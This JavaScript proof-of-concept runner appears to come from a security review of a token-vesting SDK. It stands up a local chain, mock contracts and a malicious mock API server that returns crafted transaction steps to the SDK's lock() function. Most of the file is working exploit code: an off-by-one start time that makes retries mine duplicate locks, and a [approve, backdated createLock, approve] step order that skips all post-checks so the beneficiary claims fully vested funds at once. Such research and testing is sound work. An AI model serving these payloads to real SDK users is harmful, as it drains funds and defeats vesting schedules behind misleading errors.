// ROUND 15 — Team A: SDK lock() post-tx verification gaps vs the CURRENT
// SDK verbatim (sha 3c1319e1…, live-api-round15-a — byte-identical to
// baseline round 11). Fresh Anvil 4663 + MockERC20/MockLocker. Throwaway
// local keys only. No live POSTs, no real funds.
//
// K-873 RECONSIDERATION (Tim C round 14 KILL — re-tested with a runner):
//   P1: caller passes startAt=T; server returns start=T+1 (cliff/end
//       shifted +1s, all RELATIVE checks pass). lock() mines the lock, THEN
//       throws on the exact-equality startAt check. 1 lock exists, -500.
//   P2: caller retries the IDENTICAL call (same startAt=T). Server repeats
//       start=T+1. A SECOND lock is mined, lock() throws again. -1000 total.
//       Mechanism GREEN; verdict turns on whether retry-after-explicit-error
//       is realistic (see triage).
//   C0: honest lock with startAt exact -> returns id, 1 lock, no throw.
// K-897 (NEW — PASS candidate):
//   P3: server returns steps [approve, createLock(BACKDATED), approve].
//       lock() only parses the LAST step's receipt (rc overwritten each
//       loop iteration), so the LockCreated post-check NEVER RUNS:
//       lock() throws "LockCreated event not found" — but the lock EXISTS,
//       fully vested, and the beneficiary claims all 500 AT ONCE in a
//       SINGLE call with a misleading error. Evades EVERY post-check
//       (token/beneficiary/amount/schedule, incl. the K-873 exact check and
//       any B-26 absolute-start fix). Different fix from B-26 (verify every
//       step's receipt / require LockCreated in the createLock step).
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  createPublicClient, createWalletClient, http as vhttp, defineChain,
  parseAbi, encodeFunctionData, parseUnits, erc20Abi,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { Bull } from "./sdk-live.mjs";

const ROOT = path.dirname(fileURLToPath(import.meta.url));
const RPC = "http://127.0.0.1:8547";
const API_PORT = 3015;
const ZERO = "0x0000000000000000000000000000000000000000";

const chain = defineChain({ id: 4663, name: "Robinhood Chain",
  nativeCurrency: { decimals: 18, name: "ETH", symbol: "ETH" },
  rpcUrls: { default: { http: [RPC] } } });
const victimKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
const employeeKey = "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a";
const victim = privateKeyToAccount(victimKey);
const employee = privateKeyToAccount(employeeKey);
const V = victim.address, E = employee.address;

const publicClient = createPublicClient({ chain, transport: vhttp(RPC) });
const walletV = createWalletClient({ chain, transport: vhttp(RPC), account: victim });
const walletE = createWalletClient({ chain, transport: vhttp(RPC), account: employee });
const now = async () => Number((await publicClient.getBlock()).timestamp);

const LOCKER_ABI = parseAbi([
  "function createLock(address token,uint256 amount,address beneficiary,uint64 start,uint64 cliff,uint64 end,uint64 step) returns (uint256)",
  "function claim(uint256 id)",
  "function claimable(uint256 id) view returns (uint256)",
  "function getLock(uint256 id) view returns (address token,address beneficiary,uint256 amount,uint64 start,uint64 cliff,uint64 end,uint64 step)",
  "function nextId() view returns (uint256)",
]);
const approveCall = (spender, amt) => encodeFunctionData({ abi: erc20Abi, functionName: "approve", args: [spender, amt] });
const tx = (to, data, value = "0") => ({ to, data, value });
const bal = (token, who) => publicClient.readContract({ address: token, abi: erc20Abi, functionName: "balanceOf", args: [who] });
const lockCount = async (locker) => Number(await publicClient.readContract({ address: locker, abi: LOCKER_ABI, functionName: "nextId" })) - 1;

async function rpc(method, params) {
  const r = await fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
  const j = await r.json(); if (j.error) throw new Error(method + ": " + JSON.stringify(j.error)); return j.result;
}

let TOKEN, LOCKER;
const current = { mode: "honest" };
const server = http.createServer(async (req, res) => {
  const rawBody = await new Promise((r) => { let d = ""; req.on("data", (c) => (d += c)); req.on("end", () => r(d)); });
  let body = {}; try { body = JSON.parse(rawBody); } catch {}
  const send = (o) => { res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify(o)); };
  const t = await now();
  const amt = parseUnits("500", 18);
  const lockData = (beneficiary, start, cliff, end) => encodeFunctionData({ abi: LOCKER_ABI, functionName: "createLock",
    args: [TOKEN, amt, beneficiary, BigInt(start), BigInt(cliff), BigInt(end), 0n] });
  if (req.url === "/api/v1/vesting" && req.method === "POST") {
    if (current.mode === "k873-offbyone") {
      // Caller passed startAt; server shifts start +1s (cliff/end +1s too).
      const startAt = Math.floor(Number(body.startAt || t));
      const d = lockData(E, startAt + 1, startAt + 1 + 90 * 86400, startAt + 1 + 365 * 86400);
      return send({ steps: [
        { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
        { transaction: tx(LOCKER, d) },
      ] });
    }
    if (current.mode === "k897-orderswap") {
      // Backdated start (B-26 shape) with a TRAILING approve AFTER the
      // createLock: lock() parses only the LAST step's receipt -> the
      // LockCreated post-check NEVER RUNS. (A bare [createLock, approve]
      // order cannot work: createLock needs the allowance first — the
      // trailing approve is what makes the evasion executable.)
      const start = t - 455 * 86400;
      const d = lockData(E, start, start + 90 * 86400, start + 365 * 86400);
      return send({ steps: [
        { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
        { transaction: tx(LOCKER, d) },
        { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
      ] });
    }
    // honest: start exactly at the caller's startAt (or now if omitted)
    const startAt = Math.floor(Number(body.startAt || t));
    const d = lockData(E, startAt, startAt + 90 * 86400, startAt + 365 * 86400);
    return send({ steps: [
      { transaction: tx(TOKEN, approveCall(LOCKER, amt)) },
      { transaction: tx(LOCKER, d) },
    ] });
  }
  res.writeHead(404); res.end("{}");
});

async function main() {
  await new Promise((r) => server.listen(API_PORT, r));
  const mocks = JSON.parse(fs.readFileSync(path.join(ROOT, "chain/out/Mocks.sol/MockERC20.json"), "utf8"));
  const lockerJson = JSON.parse(fs.readFileSync(path.join(ROOT, "chain/out/Mocks.sol/MockLocker.json"), "utf8"));
  const hash = await walletV.deployContract({ abi: mocks.abi, bytecode: mocks.bytecode.object, args: [] });
  TOKEN = (await publicClient.waitForTransactionReceipt({ hash })).contractAddress;
  const lh = await walletV.deployContract({ abi: lockerJson.abi, bytecode: lockerJson.bytecode.object, args: [] });
  LOCKER = (await publicClient.waitForTransactionReceipt({ hash: lh })).contractAddress;
  await walletV.writeContract({ address: TOKEN, abi: mocks.abi, functionName: "mint", args: [V, 100000n * 10n ** 18n] });

  const bull = new Bull({ walletClient: walletV, publicClient, baseUrl: `http://127.0.0.1:${API_PORT}` });
  const results = [];
  const amt500 = parseUnits("500", 18);

  // ---- C0: honest lock, startAt exact ----
  try {
    current.mode = "honest";
    const t = await now();
    const params = { token: TOKEN, amount: "500", beneficiary: E, cliffDays: 90, durationDays: 365, stepDays: 0, startAt: t + 60, locker: LOCKER };
    const vicBefore = await bal(TOKEN, V);
    const nBefore = await lockCount(LOCKER);
    const id = await bull.lock(params);
    const vicAfter = await bal(TOKEN, V);
    const nAfter = await lockCount(LOCKER);
    const claimable = await publicClient.readContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "claimable", args: [BigInt(id)] });
    const ok = vicBefore - vicAfter === amt500 && nAfter - nBefore === 1 && claimable === 0n;
    results.push({ case: "C0 honest lock startAt exact", ok, lockIdReturned: String(id),
      detail: `lock() returned id ${id}; victim -500 exactly; locks ${nBefore}->${nAfter}; claimable ${claimable}` });
    console.log("[C0] ok:", ok, "id:", id);
  } catch (e) {
    results.push({ case: "C0 honest lock startAt exact", ok: false, detail: "threw: " + String(e.message || e).slice(0, 200) });
    console.log("[C0] threw:", String(e.message || e).slice(0, 150));
  }

  // ---- K-873 P1: startAt off-by-one, single call ----
  let k873params = null;
  try {
    current.mode = "k873-offbyone";
    const t = await now();
    k873params = { token: TOKEN, amount: "500", beneficiary: E, cliffDays: 90, durationDays: 365, stepDays: 0, startAt: t + 60, locker: LOCKER };
    const vicBefore = await bal(TOKEN, V);
    const nBefore = await lockCount(LOCKER);
    let threw = null, id = null;
    try { id = await bull.lock(k873params); } catch (e) { threw = String(e.message || e); }
    const vicAfter = await bal(TOKEN, V);
    const nAfter = await lockCount(LOCKER);
    const lockExists = nAfter - nBefore === 1 && vicBefore - vicAfter === amt500;
    results.push({ case: "K-873 P1 startAt off-by-one (+1s), single call", exploited: false,
      lockThrew: threw, lockIdReturned: id, locksCreated: nAfter - nBefore, victimLost: (vicBefore - vicAfter).toString(),
      mechanismGreen: threw !== null && lockExists,
      detail: `lock() THREW post-tx: "${(threw || "").slice(0, 160)}" — but lock #${nBefore + 1} WAS mined for the named beneficiary (-500). The throw happens AFTER the tx; the error names the schedule mismatch but never says a lock was already created.` });
    console.log("[K-873 P1] threw:", !!threw, "| locks:", nBefore, "->", nAfter, "| victim -500:", lockExists);
  } catch (e) {
    results.push({ case: "K-873 P1 startAt off-by-one (+1s), single call", exploited: false, detail: "runner error: " + String(e.message || e).slice(0, 300) });
    console.log("[K-873 P1] runner error:", String(e.message || e).slice(0, 150));
  }

  // ---- K-873 P2: retry the IDENTICAL call ----
  try {
    current.mode = "k873-offbyone";
    const vicBefore = await bal(TOKEN, V);
    const nBefore = await lockCount(LOCKER);
    let threw = null, id = null;
    try { id = await bull.lock(k873params); } catch (e) { threw = String(e.message || e); }
    const vicAfter = await bal(TOKEN, V);
    const nAfter = await lockCount(LOCKER);
    const doubled = nAfter - nBefore === 1 && vicBefore - vicAfter === amt500;
    results.push({ case: "K-873 P2 retry identical call (same startAt)", exploited: false,
      lockThrew: threw, lockIdReturned: id, locksCreated: nAfter - nBefore, victimLost: (vicBefore - vicAfter).toString(),
      mechanismGreen: threw !== null && doubled,
      detail: `Retry of the identical call mined a SECOND lock (locks ${nBefore}->${nAfter}, victim -500 again, -1000 total across P1+P2) and threw again with the same message. Each retry mints +1 lock to the caller-named beneficiary. No attacker theft: funds go to the beneficiary the caller named.` });
    console.log("[K-873 P2] threw:", !!threw, "| locks:", nBefore, "->", nAfter, "| doubled:", doubled);
  } catch (e) {
    results.push({ case: "K-873 P2 retry identical call (same startAt)", exploited: false, detail: "runner error: " + String(e.message || e).slice(0, 300) });
    console.log("[K-873 P2] runner error:", String(e.message || e).slice(0, 150));
  }

  // ---- K-897 P3: order-swap — [approve, createLock backdated, approve] ----
  try {
    current.mode = "k897-orderswap";
    const params = { token: TOKEN, amount: "500", beneficiary: E, cliffDays: 90, durationDays: 365, stepDays: 0, locker: LOCKER };
    const vicBefore = await bal(TOKEN, V);
    const nBefore = await lockCount(LOCKER);
    let threw = null, id = null;
    try { id = await bull.lock(params); } catch (e) { threw = String(e.message || e); }
    const vicAfter = await bal(TOKEN, V);
    const nAfter = await lockCount(LOCKER);
    const createdId = nAfter > nBefore ? BigInt(nBefore + 1) : null;
    let claimable = null, claimed = null;
    if (createdId !== null) {
      claimable = await publicClient.readContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "claimable", args: [createdId] });
      const empBefore = await bal(TOKEN, E);
      await walletE.writeContract({ address: LOCKER, abi: LOCKER_ABI, functionName: "claim", args: [createdId] });
      const empAfter = await bal(TOKEN, E);
      claimed = empAfter - empBefore;
    }
    const exploited = threw !== null && /LockCreated event not found/.test(threw) && nAfter - nBefore === 1
      && claimable === amt500 && claimed === amt500;
    results.push({ case: "K-897 lock() step-order swap [approve, createLock backdated, approve]", exploited,
      lockThrew: threw, lockIdReturned: id, locksCreated: nAfter - nBefore,
      victimLost: (vicBefore - vicAfter).toString(), claimableAtOnce: claimable === null ? null : claimable.toString(),
      employeeClaimedAtOnce: claimed === null ? null : claimed.toString(),
      detail: `SINGLE call, NO retry: lock() threw "${(threw || "").slice(0, 80)}" (misleading — a lock WAS created) while lock #${createdId} sat fully vested; beneficiary claimed all 500 at once though the caller asked cliff 90d / duration 365d. Post-check never ran: lock() parses only the LAST step's receipt.` });
    console.log("[K-897] exploited:", exploited, "| threw:", (threw || "").slice(0, 60), "| claimed at once:", claimed === null ? null : claimed.toString());
  } catch (e) {
    results.push({ case: "K-897 lock() step-order swap [approve, createLock backdated, approve]", exploited: false, detail: "runner error: " + String(e.message || e).slice(0, 300) });
    console.log("[K-897] runner error:", String(e.message || e).slice(0, 150));
  }

  console.log(JSON.stringify(results, null, 2));
  const exploited = results.filter((r) => r.exploited).length;
  const mechGreen = results.filter((r) => r.mechanismGreen).length;
  const controlsOk = results.filter((r) => r.ok).length;
  console.log(`EXPLOITED: ${exploited} | K-873 MECHANISM GREEN: ${mechGreen}/2 | CONTROLS OK: ${controlsOk}/1 (C0)`);
  server.close();
  process.exit(0);
}
main().catch((e) => { console.error("RUNNER FATAL", e); server.close(); process.exit(2); });
